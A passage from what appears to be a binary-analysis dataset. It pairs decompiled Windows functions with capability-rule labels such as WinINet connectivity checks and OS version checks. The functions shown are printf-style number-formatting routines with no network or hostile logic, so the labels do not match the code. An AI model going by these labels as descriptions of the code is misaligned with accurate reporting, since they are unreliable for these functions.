fcn.1400113f0();\n        }\ncode_r0x000140013dd0:\n        uVar7 = *(iVar6 + 0xb0);\n    }\n    else {\n        if (*(iVar6 + 0xb0) != 0) goto code_r0x000140013dd0;\ncode_r0x000140013d59:\n        uVar7 = 0x14001b0e0;\n        *(iVar6 + 0xb0) = 0x14001b0e0;\n    }\n    fcn.1400132a0(uVar7);\n    iVar4 = 0x10;\n    if (*arg1 == -1) {\n        *arg1 = 0;\n        iVar4 = 0;\n    }\n    iVar6 = *piVar2;\n    if (iVar6 == 0) {\n        iVar5 = fcn.1400113f0();\n        iVar6 = *piVar2;\n        if (*(iVar5 + 0xb0) != 0) {\n            if (iVar6 == 0) {\n                iVar6 = fcn.1400113f0();\n            }\n            goto code_r0x000140013d98;\n        }\n    }\n    else if (*(iVar6 + 0xb0) != 0) {\ncode_r0x000140013d98:\n        uVar7 = *(iVar6 + 0xb0);\n        goto code_r0x000140013d9f;\n    }\n    uVar7 = 0x14001b0e0;\n    *(iVar6 + 0xb0) = 0x14001b0e0;\ncode_r0x000140013d9f:\n    fcn.1400132e0(uVar7);\n    return iVar4;\n}\n",
        "token_count": 1047
    },
    "1400151b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h_2\n\nvoid fcn.1400151b0(uint64_t arg1, uint64_t noname_1, int64_t *arg3)\n\n{\n    uint8_t uVar1;\n    int64_t iVar2;\n    uint8_t uVar3;\n    ulong arg1_00;\n    uchar *puVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint32_t uVar9;\n    uint8_t uVar10;\n    int32_t iVar11;\n    uint8_t uVar12;\n    uint8_t *puVar13;\n    int32_t iVar14;\n    uint8_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    ulong var_8h;\n    uchar auStack120 [32];\n    uint8_t auStack88 [8];\n    int64_t iStack80;\n    ulong var_8h_2;\n    \n    uVar15 = arg1 & 0xffffffff;\n    iVar6 = arg1 & 0xffffffff;\n    if (arg1 == 0x6f) {\n        iVar16 = *(arg3 + 2);\n        uVar9 = *(arg3 + 1);\n        if ((uVar9 & 0x1000) == 0) {\n            iVar14 = *(arg3 + 0xc);\n        }\n        else {\n            if (*(arg3 + 4) != 0) {\n                arg1_00 = 3;\n                goto code_r0x0001400153c1;\n            }\n            iVar14 = *(arg3 + 0xc);\n        }\n        iVar2 = fcn.14000ae90(arg1);\n        uVar3 = 3;\n        puVar4 = &stack0xffffffffffffff88 + -iVar2;\n        puVar7 = &stack0xffffffffffffffa8 + -iVar2;\ncode_r0x000140015542:\n        uVar10 = 7;\ncode_r0x000140015224:\n        puVar5 = puVar4;\n        puVar13 = puVar7;\n        if (noname_1 == 0) goto code_r0x000140015418;\ncode_r0x000140015230:\n        puVar8 = puVar13;\n        do {\n            puVar7 = puVar8 + 1;\n            uVar1 = uVar10 & noname_1;\n            uVar12 = uVar1 + 0x30;\n            uVar1 = uVar1 + 0x37 | uVar15 & 0x20;\n            if (uVar12 < 0x3a) {\n                uVar1 = uVar12;\n            }\n            noname_1 = noname_1 >> (uVar3 & 0x3f);\n            *puVar8 = uVar1;\n            puVar8 = puVar7;\n        } while (noname_1 != 0);\n        if (puVar7 == puVar13) goto code_r0x000140015418;\n        if (0 < iVar16) goto code_r0x00014001527b;\ncode_r0x000140015430:\n        if ((iVar6 == 0x6f) && ((*(arg3 + 9) & 8) != 0)) {\n            *puVar8 = 0x30;\n            puVar8 = puVar8 + 1;\n        }\n        if ((puVar8 != puVar13) || (iVar16 == 0)) goto code_r0x0001400152af;\ncode_r0x00014001544c:\n        *puVar8 = 0x30;\n        puVar8 = puVar8 + 1;\n        iVar11 = puVar8 - puVar13;\n        if (iVar14 <= iVar11) goto code_r0x0001400152be;\ncode_r0x000140015468:\n        iVar14 = iVar14 - iVar11;\n        uVar9 = *(arg3 + 1);\n        *(arg3 + 0xc) = iVar14;\n        if (iVar6 == 0x6f) {\n            if (-1 < iVar16) goto joined_r0x00014001557f;\n            iVar16 = iVar14 + -1;\n            if ((uVar9 & 0x600) == 0x200) {\ncode_r0x000140015636:\n                iVar14 = iVar16 - iVar14;\n                iStack80 = iVar16 + 1;\n                *(puVar5 + -8) = 0x140015654;\n                sub.msvcrt.dll_memset(puVar8, 0x30);\n                puVar7 = puVar8 + iStack80;\n                if ((iVar6 != 0x6f) && (puVar8 = puVar7,  (uVar9 & 0x800) != 0)) goto code_r0x00014001549a;\n                goto code_r0x0001400154a5;\n            }\n            if ((uVar9 & 0x400) != 0) goto joined_r0x0001400155b8;\n        }\n        else {\n            if ((uVar9 & 0x800) == 0) {\n                if (-1 < iVar16) goto joined_r0x00014001557f;\ncode_r0x000140015680:\n                if ((uVar9 & 0x600) == 0x200) {\n                    iVar16 = iVar14 + -1;\n                    goto code_r0x000140015636;\n                }\n                if ((uVar9 & 0x800) == 0) goto joined_r0x00014001557f;\n            }\n            else {\n                iVar14 = iVar14 + -2;\n                if ((0 < iVar14) && (iVar16 < 0)) goto code_r0x000140015680;\n            }\ncode_r0x00014001549a:\n            *puVar8 = uVar15;\n            puVar7 = puVar8 + 2;\n            puVar8[1] = 0x30;\ncode_r0x0001400154a5:\n            if (iVar14 < 1) {\ncode_r0x0001400152df:\n                puVar8 = puVar7;\n                iVar6 = iVar14;\n                if (puVar7 <= puVar13) {\n                    return;\n                }\n                goto code_r0x000140015305;\n            }\n            uVar9 = *(arg3 + 1);\n            puVar8 = puVar7;\njoined_r0x00014001557f:\n            if ((uVar9 & 0x400) != 0) {\njoined_r0x0001400155b8:\n                if (puVar13 < puVar8) goto code_r0x000140015308;\n                iVar6 = iVar14 + -1;\n                goto code_r0x000140015369;\n            }\n            iVar16 = iVar14 + -1;\n        }\n        do {\n            *(puVar5 + -8) = 0x1400154d5;\n            fcn.140014dc0(0x20, arg3);\n            bVar17 = 0 < iVar16;\n            iVar16 = iVar16 + -1;\n        } while (bVar17);\n        iVar14 = -1;\n        iVar6 = -1;\n        if (puVar8 <= puVar13) goto code_r0x00014001533d;\n    }\n    else {\n        iVar16 = *(arg3 + 2);\n        uVar9 = *(arg3 + 1);\n        if ((uVar9 & 0x1000) == 0) {\n            iVar14 = *(arg3 + 0xc);\n            iVar2 = fcn.14000ae90(arg1);\n            uVar3 = 4;\n            uVar10 = 0xf;\n            puVar4 = &stack0xffffffffffffff88 + -iVar2;\n            puVar7 = &stack0xffffffffffffffa8 + -iVar2;\n            goto code_r0x000140015224;\n        }\n        arg1_00 = 4;\n        if (*(arg3 + 4) == 0) {\n            iVar14 = *(arg3 + 0xc);\n            iVar2 = fcn.14000ae90(4);\n            uVar3 = arg1_00;\n            puVar5 = &stack0xffffffffffffff88 + -iVar2;\n            puVar7 = &stack0xffffffffffffffa8 + -iVar2;\n        }\n        else {\ncode_r0x0001400153c1:\n            iVar14 = *(arg3 + 0xc);\n            iVar2 = fcn.14000ae90(arg1_00);\n            uVar3 = arg1_00;\n            iVar2 = -iVar2;\n            puVar4 = &stack0xffffffffffffff88 + iVar2;\n            puVar5 = &stack0xffffffffffffff88 + iVar2;\n            puVar7 = &stack0xffffffffffffffa8 + iVar2;\n            if (iVar6 == 0x6f) goto code_r0x000140015542;\n        }\n        uVar10 = 0xf;\n        puVar13 = puVar7;\n        if (noname_1 != 0) goto code_r0x000140015230;\ncode_r0x000140015418:\n        *(arg3 + 1) = uVar9 & 0xfffff7ff;\n        puVar8 = puVar7;\n        if (iVar16 < 1) goto code_r0x000140015430;\ncode_r0x00014001527b:\n        iVar11 = iVar16 - (puVar7 - puVar13);\n        puVar8 = puVar7;\n        if (iVar11 < 1) goto code_r0x000140015430;\n        puVar8 = puVar7 + iVar11;\n        *(puVar5 + -8) = 0x1400152a6;\n        sub.msvcrt.dll_memset(puVar7, 0x30);\n        if (puVar8 == puVar13) goto code_r0x00014001544c;\ncode_r0x0001400152af:\n        iVar11 = puVar8 - puVar13;\n        if (iVar11 < iVar14) goto code_r0x000140015468;\ncode_r0x0001400152be:\n        *(arg3 + 0xc) = 0xffffffff;\n        if (iVar6 != 0x6f) {\n            iVar14 = -1;\n            puVar7 = puVar8;\n            if ((*(arg3 + 9) & 8) != 0) {\n                *puVar8 = uVar15;\n                puVar7 = puVar8 + 2;\n                puVar8[1] = 0x30;\n            }\n            goto code_r0x0001400152df;\n        }\n        iVar6 = -1;\n        if (puVar8 <= puVar13) {\n            return;\n        }\n    }\ncode_r0x000140015305:\n    do {\n        while( true ) {\n            iVar14 = iVar6;\n            uVar9 = *(arg3 + 1);\ncode_r0x000140015308:\n            puVar8 = puVar8 + -1;\n            iVar6 = iVar14;\n            if (((uVar9 & 0x4000) != 0) || (iVar16 = *(arg3 + 0x24),  *(arg3 + 5) != iVar16 && iVar16 <= *(arg3 + 5)))\n            break;\ncode_r0x0001400152fa:\n            *(arg3 + 0x24) = iVar16 + 1;\n            if (puVar8 <= puVar13) goto code_r0x00014001533d;\n        }\n        if ((uVar9 & 0x2000) == 0) {\n            *(*arg3 + *(arg3 + 0x24)) = *puVar8;\n            iVar16 = *(arg3 + 0x24);\n            goto code_r0x0001400152fa;\n        }\n        *(puVar5 + -8) = 0x14001532f;\n        sub.msvcrt.dll_fputc();\n        *(arg3 + 0x24) = *(arg3 + 0x24) + 1;\n    } while (puVar13 < puVar8);\ncode_r0x00014001533d:\n    iVar6 = iVar14 + -1;\n    if (0 < iVar14) {\n        do {\n            while( true ) {\n                uVar9 = *(arg3 + 1);\ncode_r0x000140015369:\n                if (((uVar9 & 0x4000) != 0) ||\n                   (iVar16 = *(arg3 + 0x24),  *(arg3 + 5) != iVar16 && iVar16 <= *(arg3 + 5))) break;\ncode_r0x00014001535b:\n                *(arg3 + 0x24) = iVar16 + 1;\n                bVar17 = iVar6 == 0;\n                iVar6 = iVar6 + -1;\n                if (bVar17) {\n                    return;\n                }\n            }\n            if ((uVar9 & 0x2000) == 0) {\n                *(*arg3 + *(arg3 + 0x24)) = 0x20;\n                iVar16 = *(arg3 + 0x24);\n                goto code_r0x00014001535b;\n            }\n            *(puVar5 + -8) = 0x14001538e;\n            sub.msvcrt.dll_fputc(0x20);\n            *(arg3 + 0x24) = *(arg3 + 0x24) + 1;\n            bVar17 = iVar6 != 0;\n            iVar6 = iVar6 + -1;\n        } while (bVar17);\n    }\n    return;\n}\n",
        "token_count": 3036
    },
    "1400156f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400156f0(uint64_t arg1, int64_t *arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    char *pcVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    ulong var_8h;\n    ulong auStack112 [5];\n    char acStack72 [8];\n    \n    iVar4 = *(arg2 + 2);\n    uVar11 = *(arg2 + 1);\n    iVar7 = *(arg2 + 0xc);\n    auStack112[0] = 0x14001574a;\n    iVar5 = fcn.14000ae90(arg1);\n    iVar5 = -iVar5;\n    pcVar3 = &stack0xffffffffffffffb8 + iVar5;\n    if ((uVar11 & 0x80) == 0) {\ncode_r0x000140015769:\n        if (arg1 != 0) goto code_r0x000140015772;\n        pcVar8 = pcVar3;\n        pcVar9 = pcVar3;\n        iVar10 = iVar4;\n        if (0 < iVar4) goto code_r0x00014001581a;\ncode_r0x0001400159b9:\n        if (iVar4 == 0) goto code_r0x000140015839;\n    }\n    else {\n        if (-1 < arg1) {\n            uVar11 = uVar11 & 0xffffff7f;\n            *(arg2 + 1) = uVar11;\n            goto code_r0x000140015769;\n        }\n        arg1 = -arg1;\ncode_r0x000140015772:\n        pcVar9 = pcVar3;\n        while( true ) {\n            pcVar8 = pcVar9;\n            pcVar9 = pcVar8 + 1;\n            uVar6 = arg1 / 10;\n            *pcVar8 = arg1 + uVar6 * -10 + '0';\n            if (arg1 < 10) break;\n            arg1 = uVar6;\n            if ((((pcVar3 != pcVar9) && ((uVar11 & 0x1000) != 0)) && (*(arg2 + 4) != 0)) &&\n               ((pcVar9 - pcVar3 & 0x8000000000000003U) == 3)) {\n                pcVar8[1] = ',';\n                pcVar9 = pcVar8 + 2;\n            }\n        }\n        if (iVar4 < 1) {\n            if (pcVar3 != pcVar9) goto code_r0x000140015839;\n            goto code_r0x0001400159b9;\n        }\n        iVar10 = iVar4 - (pcVar9 - pcVar3);\n        pcVar8 = pcVar9;\n        if (0 < iVar10) {\ncode_r0x00014001581a:\n            pcVar9 = pcVar8 + iVar10;\n            *(&stack0xffffffffffffff90 + iVar5) = 0x140015830;\n            sub.msvcrt.dll_memset(pcVar8, 0x30, iVar10);\n        }\n        if (pcVar3 != pcVar9) goto code_r0x000140015839;\n    }\n    *pcVar9 = '0';\n    pcVar9 = pcVar9 + 1;\ncode_r0x000140015839:\n    pcVar8 = pcVar9;\n    if (0 < iVar7) {\n        iVar7 = iVar7 - (pcVar9 - pcVar3);\n        *(arg2 + 0xc) = iVar7;\n        if (0 < iVar7) {\n            if ((uVar11 & 0x1c0) != 0) {\n                *(arg2 + 0xc) = iVar7 + -1;\n            }\n            if ((iVar4 < 0) && ((uVar11 & 0x600) == 0x200)) {\n                iVar4 = *(arg2 + 0xc);\n                uVar1 = iVar4 - 1;\n                *(arg2 + 0xc) = uVar1;\n                if (0 < iVar4) {\n                    iVar2 = uVar1 + 1;\n                    pcVar8 = pcVar9 + iVar2;\n                    *(&stack0xffffffffffffff90 + iVar5) = 0x140015a22;\n                    sub.msvcrt.dll_memset(pcVar9, 0x30, iVar2);\n                    *(arg2 + 0xc) = 0xffffffff;\n                }\n            }\n            else if (((uVar11 & 0x400) == 0) && (iVar4 = *(arg2 + 0xc),  *(arg2 + 0xc) = iVar4 + -1,  0 < iVar4)) {\n                do {\n                    *(&stack0xffffffffffffff90 + iVar5) = 0x140015a55;\n                    fcn.140014dc0(0x20, arg2);\n                    iVar4 = *(arg2 + 0xc);\n                    *(arg2 + 0xc) = iVar4 + -1;\n                } while (0 < iVar4);\n                uVar11 = *(arg2 + 1);\n            }\n        }\n    }\n    if ((uVar11 & 0x80) == 0) {\n        if ((uVar11 & 0x100) == 0) {\n            if ((uVar11 & 0x40) != 0) {\n                *pcVar8 = ' ';\n                pcVar8 = pcVar8 + 1;\n            }\n        }\n        else {\n            *pcVar8 = '+';\n            pcVar8 = pcVar8 + 1;\n        }\n    }\n    else {\n        *pcVar8 = '-';\n        pcVar8 = pcVar8 + 1;\n    }\n    if (pcVar3 < pcVar8) {\n        do {\n            pcVar8 = pcVar8 + -1;\n            if (((uVar11 & 0x4000) == 0) && (iVar4 = *(arg2 + 0x24),  *(arg2 + 5) == iVar4 || *(arg2 + 5) < iVar4)) {\ncode_r0x00014001589a:\n                *(arg2 + 0x24) = iVar4 + 1;\n            }\n            else {\n                if ((uVar11 & 0x2000) == 0) {\n                    *(*arg2 + *(arg2 + 0x24)) = *pcVar8;\n                    iVar4 = *(arg2 + 0x24);\n                    goto code_r0x00014001589a;\n                }\n                *(&stack0xffffffffffffff90 + iVar5) = 0x1400158d2;\n                sub.msvcrt.dll_fputc();\n                *(arg2 + 0x24) = *(arg2 + 0x24) + 1;\n            }\n            if (pcVar3 == pcVar8) break;\n            uVar11 = *(arg2 + 1);\n        } while( true );\n    }\n    iVar4 = *(arg2 + 0xc);\n    while( true ) {\n        *(arg2 + 0xc) = iVar4 + -1;\n        if (iVar4 < 1) break;\n        if (((*(arg2 + 1) & 0x4000) != 0) ||\n           (iVar7 = *(arg2 + 0x24),  iVar4 = iVar4 + -1,  *(arg2 + 5) != iVar7 && iVar7 <= *(arg2 + 5))) {\n            if ((*(arg2 + 1) & 0x2000) == 0) {\n                *(*arg2 + *(arg2 + 0x24)) = 0x20;\n                iVar7 = *(arg2 + 0x24);\n                iVar4 = *(arg2 + 0xc);\n            }\n            else {\n                *(&stack0xffffffffffffff90 + iVar5) = 0x14001592a;\n                sub.msvcrt.dll_fputc();\n                iVar7 = *(arg2 + 0x24);\n                iVar4 = *(arg2 + 0xc);\n            }\n        }\n        *(arg2 + 0x24) = iVar7 + 1;\n    }\n    return;\n}\n",
        "token_count": 1842
    },
    "140015bf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140015bf0(ulong arg1, char *arg2, ulong arg3, int64_t arg4)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    uint32_t uVar5;\n    \n    iVar2 = *(arg4 + 0xc);\n    if (arg3 < 1) {\n        if (iVar2 < 1) {\n            if (iVar2 == 0) goto code_r0x000140015dab;\n        }\n        else {\n            iVar2 = iVar2 + -1;\ncode_r0x000140015dab:\n            iVar3 = *(arg4 + 0x10);\n            if (iVar3 < iVar2) goto code_r0x000140015db6;\n        }\n        *(arg4 + 0xc) = 0xffffffff;\njoined_r0x000140015c8a:\n        if (arg1 == 0) {\n            uVar5 = *(arg4 + 8);\ncode_r0x000140015c93:\n            if ((uVar5 & 0x100) == 0) {\n                if ((uVar5 & 0x40) != 0) {\n                    fcn.140014dc0(0x20, arg4);\n                }\n            }\n            else {\n                fcn.140014dc0(0x2b, arg4);\n            }\n        }\n        else {\ncode_r0x000140015d8a:\n            fcn.140014dc0(0x2d, arg4);\n        }\n    }\n    else {\n        if (iVar2 < arg3) {\ncode_r0x000140015c2a:\n            *(arg4 + 0xc) = 0xffffffff;\n            iVar2 = -1;\n            if ((*(arg4 + 9) & 0x10) != 0) {\ncode_r0x000140015c3c:\n                if (*(arg4 + 0x20) != 0) {\ncode_r0x000140015c47:\n                    iVar3 = ((arg3 + 2U) / 3 - 1) - iVar2;\n                    if ((arg3 + 2U) / 3 != 1) {\n                        do {\n                            if (iVar2 < 1) goto joined_r0x000140015c8a;\n                            iVar2 = iVar2 + -1;\n                            *(arg4 + 0xc) = iVar2;\n                        } while (iVar3 + iVar2 != 0);\n                    }\n                }\ncode_r0x000140015d28:\n                if (0 < iVar2) goto code_r0x000140015d30;\n            }\n            goto joined_r0x000140015c8a;\n        }\n        iVar2 = iVar2 - arg3;\n        *(arg4 + 0xc) = iVar2;\n        if ((iVar2 < 0) || (iVar3 = *(arg4 + 0x10),  iVar2 <= iVar3)) goto code_r0x000140015c2a;\ncode_r0x000140015db6:\n        iVar2 = iVar2 - iVar3;\n        *(arg4 + 0xc) = iVar2;\n        if ((0 < iVar3) || ((*(arg4 + 8) & 0x800) != 0)) {\n            iVar2 = iVar2 + -1;\n            *(arg4 + 0xc) = iVar2;\n            if ((0 < arg3) && ((*(arg4 + 9) & 0x10) != 0)) goto code_r0x000140015c3c;\n            goto code_r0x000140015d28;\n        }\n        if (((0 < arg3) && ((*(arg4 + 8) & 0x1000) != 0)) && (*(arg4 + 0x20) != 0)) goto code_r0x000140015c47;\ncode_r0x000140015d30:\n        if (arg1 == 0) {\n            uVar5 = *(arg4 + 8);\n            if ((uVar5 & 0x1c0) == 0) {\n                if (((uVar5 & 0x600) == 0) && (iVar2 = *(arg4 + 0xc),  *(arg4 + 0xc) = iVar2 + -1,  0 < iVar2))\n                goto code_r0x000140015d68;\n            }\n            else {\n                *(arg4 + 0xc) = iVar2 + -1;\n                if ((iVar2 + -1 != 0) && ((uVar5 & 0x600) == 0)) goto code_r0x000140015d5c;\n            }\n            goto code_r0x000140015c93;\n        }\n        *(arg4 + 0xc) = iVar2 + -1;\n        if (iVar2 + -1 == 0) goto code_r0x000140015d8a;\n        if ((*(arg4 + 8) & 0x600) == 0) {\ncode_r0x000140015d5c:\n            *(arg4 + 0xc) = iVar2 + -2;\ncode_r0x000140015d68:\n            do {\n                fcn.140014dc0(0x20, arg4);\n                iVar2 = *(arg4 + 0xc);\n                *(arg4 + 0xc) = iVar2 + -1;\n            } while (0 < iVar2);\n            goto joined_r0x000140015c8a;\n        }\n        fcn.140014dc0(0x2d, arg4);\n    }\n    if ((0 < *(arg4 + 0xc)) && ((*(arg4 + 8) & 0x600) == 0x200)) {\n        *(arg4 + 0xc) = *(arg4 + 0xc) + -1;\n        do {\n            fcn.140014dc0(0x30, arg4);\n            iVar2 = *(arg4 + 0xc);\n            *(arg4 + 0xc) = iVar2 + -1;\n        } while (0 < iVar2);\n    }\n    if (arg3 < 1) {\n        fcn.140014dc0(0x30, arg4);\n        iVar2 = *(arg4 + 0x10);\n        if ((iVar2 < 1) && ((*(arg4 + 9) & 8) == 0)) {\n            if (arg3 == 0) goto code_r0x000140015ded;\n        }\n        else {\n            fcn.140015a90(arg4);\n            if (arg3 == 0) goto code_r0x000140015e2b;\n            iVar2 = *(arg4 + 0x10);\n        }\n        *(arg4 + 0x10) = iVar2 + arg3;\n        do {\n            fcn.140014dc0(0x30, arg4);\n            arg3._0_4_ = arg3 + 1;\n        } while (arg3 != 0);\n    }\n    else {\n        while( true ) {\n            cVar1 = *arg2;\n            uVar4 = 0x30;\n            if (cVar1 != '\\0') {\n                arg2 = arg2 + 1;\n                uVar4 = cVar1;\n            }\n            fcn.140014dc0(uVar4, arg4);\n            arg3._0_4_ = arg3 + -1;\n            if (arg3 == 0) break;\n            if ((((*(arg4 + 9) & 0x10) != 0) && (*(arg4 + 0x20) != 0)) && (arg3 * -0x55555555 < 0x55555556)) {\n                fcn.140014e20(arg4 + 0x20, 1, arg4);\n            }\n        }\n        iVar2 = *(arg4 + 0x10);\n        if ((iVar2 < 1) && ((*(arg4 + 9) & 8) == 0)) {\ncode_r0x000140015ded:\n            *(arg4 + 0x10) = iVar2 + -1;\n            return;\n        }\n        fcn.140015a90(arg4);\n    }\ncode_r0x000140015e2b:\n    while (iVar2 = *(arg4 + 0x10),  *(arg4 + 0x10) = iVar2 + -1,  0 < iVar2) {\n        cVar1 = *arg2;\n        uVar4 = 0x30;\n        if (cVar1 != '\\0') {\n            arg2 = arg2 + 1;\n            uVar4 = cVar1;\n        }\n        fcn.140014dc0(uVar4, arg4);\n    }\n    return;\n}\n",
        "token_count": 1940
    },
    "14001639": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.140016390(uint64_t *arg1, int64_t *arg2)\n\n{\n    char *pcVar1;\n    int16_t iVar2;\n    char cVar3;\n    uint16_t uVar4;\n    uint8_t uVar5;\n    int64_t iVar6;\n    uint32_t uVar7;\n    uchar *puVar8;\n    uint64_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int64_t iVar12;\n    uint64_t uVar13;\n    uint8_t *puVar14;\n    int32_t iVar15;\n    uint16_t uVar16;\n    char *pcVar17;\n    char *pcVar18;\n    int32_t iVar19;\n    int32_t iVar20;\n    int32_t iVar21;\n    int32_t iVar22;\n    ulong auStack112 [2];\n    int16_t iStack90;\n    uint8_t uStack88;\n    uint8_t auStack87 [15];\n    char acStack72 [8];\n    ulong uStack64;\n    \n    uVar9 = *arg1;\n    uVar7 = *(arg1 + 1);\n    uVar16 = uVar7;\n    uVar10 = uVar9 >> 0x20 & 0x7fffffff | uVar9;\n    if (0xfffe - ((-uVar10 | uVar10) >> 0x1f | uVar16 * 2 & 0xffffU) >> 0x10 != 0) {\n        iVar6 = 0x1400d6c87;\n        uVar7 = 0;\n        goto code_r0x0001400166c4;\n    }\n    if (uVar16 < 0) {\n        *(arg2 + 1) = *(arg2 + 1) | 0x80;\n        if ((uVar7 & 0x7fff) == 0) goto code_r0x0001400163f4;\ncode_r0x000140016598:\n        if (((uVar16 & 0x7fff) == 0x7fff) && (uVar10 == 0)) {\n            iVar6 = 0x1400d6c8b;\n            uVar7 = uVar16 & 0x8000;\ncode_r0x0001400166c4:\n            uVar10 = *(arg2 + 1);\n            *(arg2 + 2) = 0xffffffff;\n            if (uVar7 == 0) {\n                if ((uVar10 & 0x100) == 0) {\n                    if ((uVar10 & 0x40) == 0) {\n                        puVar8 = &stack0xfffffffffffffff4;\n                    }\n                    else {\n                        puVar8 = &stack0xfffffffffffffff5;\n                    }\n                }\n                else {\n                    puVar8 = &stack0xfffffffffffffff5;\n                }\n            }\n            else {\n                puVar8 = &stack0xfffffffffffffff5;\n            }\n            iVar12 = 0;\n            do {\n                puVar8[iVar12] = *(iVar6 + iVar12) & 0xdf | uVar10 & 0x20;\n                iVar12 = iVar12 + 1;\n            } while (iVar12 != 3);\n            uStack64 = 0x140015153;\n            fcn.140014f80(&stack0xfffffffffffffff4, puVar8 + (3 - &stack0xfffffffffffffff4), arg2);\n            return;\n        }\n        uVar7 = *(arg2 + 2);\n        uVar16 = (uVar16 & 0x7fff) + 0xc001;\n        if (uVar7 < 0xf) {\n            for (; -1 < uVar9; uVar9 = uVar9 * 2) {\ncode_r0x000140016600:\n            }\n            goto code_r0x000140016605;\n        }\n        if (uVar9 != 0) goto code_r0x000140016633;\ncode_r0x00014001640b:\n        uVar7 = *(arg2 + 1);\ncode_r0x000140016415:\n        puVar14 = &uStack88;\n        if ((0 < *(arg2 + 2)) || ((uVar7 & 0x800) != 0)) {\n            uStack88 = 0x2e;\n            puVar14 = auStack87;\n        }\n        *puVar14 = 0x30;\n        puVar14 = puVar14 + 1;\n    }\n    else {\n        if ((uVar7 & 0x7fff) != 0) goto code_r0x000140016598;\ncode_r0x0001400163f4:\n        uVar16 = uVar16 & 0x7fff;\n        if (uVar9 == 0) {\n            uVar7 = *(arg2 + 2);\n            if (uVar7 < 0xf) goto code_r0x000140016600;\n            goto code_r0x00014001640b;\n        }\n        if (uVar9 < 0) {\n            uVar16 = 0xc002;\n        }\n        else {\n            uVar4 = 0xc001;\n            do {\n                uVar16 = uVar4;\n                uVar9 = uVar9 * 2;\n                uVar4 = uVar16 - 1;\n            } while (-1 < uVar9);\n        }\n        uVar7 = *(arg2 + 2);\n        if (0xe < uVar7) goto code_r0x000140016633;\ncode_r0x000140016605:\n        uVar9 = (uVar9 >> 1) + (4 << (('\\x0e' - uVar7) * '\\x04' & 0x3fU));\n        if (uVar9 < 0) {\n            uVar16 = uVar16 + 1;\n        }\n        else {\n            uVar9 = uVar9 * 2;\n        }\n        uVar9 = uVar9 >> (('\\x0f' - uVar7) * '\\x04' & 0x3fU);\ncode_r0x000140016633:\n        uVar7 = *(arg2 + 1);\n        puVar14 = &uStack88;\n        do {\n            uVar13 = uVar9 & 0xf;\n            uVar10 = uVar9 & 0xf;\n            if ((uVar9 & 0xfffffffffffffff0) == 0) {\n                if (((&uStack88 < puVar14) || ((uVar7 & 0x800) != 0)) || (0 < *(arg2 + 2))) {\n                    *puVar14 = 0x2e;\n                    puVar14 = puVar14 + 1;\n                }\n                for (; uVar9 != 1; uVar9 = uVar9 >> 1) {\n                    uVar16 = uVar16 - 1;\n                }\n                uVar9 = 0;\n            }\n            else {\n                uVar9 = uVar9 >> 4;\n                if (0 < *(arg2 + 2)) {\n                    *(arg2 + 2) = *(arg2 + 2) + -1;\n                }\n            }\n            cVar3 = uVar10;\n            if (uVar13 == 0) {\n                if ((&uStack88 < puVar14) || (-1 < *(arg2 + 2))) goto code_r0x000140016666;\n            }\n            else {\n                if (uVar10 < 10) {\ncode_r0x000140016666:\n                    uVar5 = cVar3 + 0x30;\n                }\n                else {\n                    uVar5 = cVar3 + 0x37U | uVar7 & 0x20;\n                }\n                *puVar14 = uVar5;\n                puVar14 = puVar14 + 1;\n            }\n        } while (uVar9 != 0);\n        if (puVar14 == &uStack88) goto code_r0x000140016415;\n    }\n    iVar22 = *(arg2 + 0xc);\n    iVar15 = 2;\n    if (0 < iVar22) {\n        iVar11 = puVar14 - &uStack88;\n        if (0 < *(arg2 + 2)) {\n            iVar11 = *(arg2 + 2) + iVar11;\n        }\n        iVar21 = (iVar11 + 6) - ((uVar7 & 0x1c0) == 0);\n        iVar11 = uVar16 / 10 - (uVar16 >> 0x1f);\n        iVar20 = iVar21;\n        iVar19 = iVar21;\n        if (iVar11 != 0) {\n            do {\n                iVar20 = iVar19 + 1;\n                iVar2 = iVar19;\n                iVar11 = iVar11 / 10;\n                iVar19 = iVar20;\n            } while (iVar11 != 0);\n            iVar15 = (iVar2 + 3) - iVar21;\n        }\n        if (iVar20 < iVar22) {\n            iVar22 = iVar22 - iVar20;\n            if ((uVar7 & 0x600) == 0) {\n                *(arg2 + 0xc) = iVar22 + -1;\n                if (0 < iVar22) {\n                    do {\n                        fcn.140014dc0(0x20, arg2);\n                        iVar22 = *(arg2 + 0xc);\n                        *(arg2 + 0xc) = 